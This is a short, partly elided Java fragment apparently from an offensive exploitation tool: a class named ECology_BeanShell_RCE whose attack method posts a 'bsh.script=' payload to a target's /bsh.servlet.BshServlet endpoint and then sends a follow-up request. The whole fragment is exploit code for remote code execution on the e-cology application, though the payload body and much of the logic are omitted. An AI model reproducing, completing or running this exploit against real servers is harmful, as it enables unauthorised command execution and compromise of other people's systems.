...
public class ECology_BeanShell_RCE extends BaseExp implements AttackBase {
    ...
    public void attack(String stripUrl, String gadgetType, String payloadType, String trojanType)  {
        ...
        try {
            ...
            String payloadString = "bsh.script=" + (String)payload;
            this.launch(stripUrl + "/bsh.servlet.BshServlet" , payloadString, mime, header);
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response = this.launch(stripUrl + "/xxx", header);
